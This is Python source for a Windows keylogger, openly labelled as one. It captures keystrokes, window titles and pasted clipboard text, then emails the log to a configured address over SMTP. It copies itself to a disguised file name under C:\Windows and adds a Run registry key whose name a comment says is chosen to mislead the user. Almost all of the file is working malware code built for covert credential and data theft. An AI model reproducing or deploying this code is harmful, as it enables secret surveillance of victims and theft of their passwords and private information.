# -*- coding: utf-8 -*- 
#  A sample keyloger,and send email to someone.
#  running in windows.using PyInstaller converts
#  Python into an alone .exe.
#
#  Author:Linger
#  Mail:lingerhk@gmail.com

import os
import sys
import time
import socket
import thread
import win32api
import smtplib
import shutil
import pythoncom
import pyHook
import win32clipboard
from ctypes import *
from email.mime.text import MIMEText

 
user32 = windll.user32
kernel32 = windll.kernel32
psapi = windll.psapi
current_window = None

client_id = 'yang-PC'
mail_from = 'xxxxxx@sina.com' #一个已注册的邮箱
mail_pass = 'xxxxx' #邮箱密码
mail_to = 'xxxxx@qq.com' #接受的邮件地址
filename = 'log.txt'
dst_path = r'C:\Windows\local_services.exe'


# 写入文件
def write_txt(log):
	f = open(filename,'a+')
	f.write(log)
	f.close()

# 检测网络	
def network():

	client = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
	try:
		client.connect(('www.baidu.com',80))
		return True
	except:
		return False
	
		
# 发送邮件	
def send_Information(t):

	while True:
		if (network() and (t == 1)):
			f = open(filename,'r')
			lines = f.readlines()
			f.close()
			info = ''.join(lines)
			if (len(info)< 2):
				break
			msg = MIMEText(info, 'plain', 'utf-8')
			msg['Subject'] = client_id
			msg['From'] = mail_from
			msg['To'] = mail_to
			smtp = smtplib.SMTP()
			smtp.connect('smtp.sina.com')
			smtp.login(mail_from,mail_pass)
			smtp.sendmail(mail_from,mail_to,msg.as_string())
			smtp.quit()
			print 'mail send ok!'
			f = open(filename,'w')
			f.close()
			break
		else:
			print 'no network,sleep 80s.'
			time.sleep(80)
	

#获取最上层的窗口句柄 
def get_current_process():
 
    # 获取最上层的窗口句柄
    hwnd = user32.GetForegroundWindow()
 
    # 获取进程ID
    pid = c_ulong(0)
    user32.GetWindowThreadProcessId(hwnd,byref(pid))
 
    # 将进程ID存入变量中
    process_id = "%d" % pid.value
 
    # 申请内存
    executable = create_string_buffer("\x00"*512)
    h_process = kernel32.OpenProcess(0x400 | 0x10,False,pid)
 
    psapi.GetModuleBaseNameA(h_process,None,byref(executable),512)
 
    # 读取窗口标题
    windows_title = create_string_buffer("\x00"*512)
    length = user32.GetWindowTextA(hwnd,byref(windows_title),512)
 
    # 写入文件
    write_txt('\n[ PID:'+process_id+']-'+executable.value+'-'+windows_title.value+'\n==>')
 
    # 关闭handles
    kernel32.CloseHandle(hwnd)
    kernel32.CloseHandle(h_process)
 
# 定义击键监听事件函数
def KeyStroke(event):

    global current_window
 
    # 检测目标窗口是否转移(换了其他窗口就监听新的窗口)
    if event.WindowName != current_window:
        current_window = event.WindowName
        # 函数调用
        get_current_process()
 
    # 检测击键是否常规按键（非组合键等）
    if event.Ascii > 32 and event.Ascii <127:
        write_txt(chr(event.Ascii))
    else:
        # 如果发现Ctrl+v（粘贴）事件，就把粘贴板内容记录下来
        if event.Key == "V":
            win32clipboard.OpenClipboard()
            pasted_value = win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()
            write_txt('[PASTE]-'+pasted_value)
        else:
            write_txt('['+event.Key+']')
    # 循环监听下一个击键事件
    return True 
 
#main_funcation 
def keyloger():

	# 创建并注册hook管理器
	kl = pyHook.HookManager()
	kl.KeyDown = KeyStroke
 
	# 注册hook并执行
	kl.HookKeyboard()
	pythoncom.PumpMessages()

#获得程序的路径
def getPath():
    path=os.getcwd()+'local_services.exe' #注意该文件的名字
    return path
	
	
#拷贝自身到指定文件
def copy_self(dst_path):
	try:
		shutil.copyfile(getPath(), dst_path)
	except:
		#pass
		print 'pro'

#添加开机自启动,在注册表里注册
def add_start(path):
	try:
		subkey='SOFTWARE\Microsoft\Windows\CurrentVersion\Run'
		key=win32api.RegOpenKey(win32con.HKEY_LOCAL_MACHINE,subkey,0,win32con.KEY_ALL_ACCESS)
		win32api.RegSetValueEx(key,'system_config',0,win32con.REG_SZ,path) #为了迷惑用户而使用的注册表名字
	except:
		pass
	
if __name__=='__main__':		
			
	if (os.path.exists(dst_path)):
		print '1'
		pass
	else:
		print '2'
		copy_self(dst_path)
		os.system(dst_path)
		sys.exit(0)

	t = 1
	try:
		f = open(filename)
		f.close()
	except:
		f = open(filename,'w')
		f.close()
		t = 0
		add_start(getPath()) #添加开机自启动
		
	thread.start_new_thread(send_Information,(t,))
	time.sleep(1)
	keyloger()
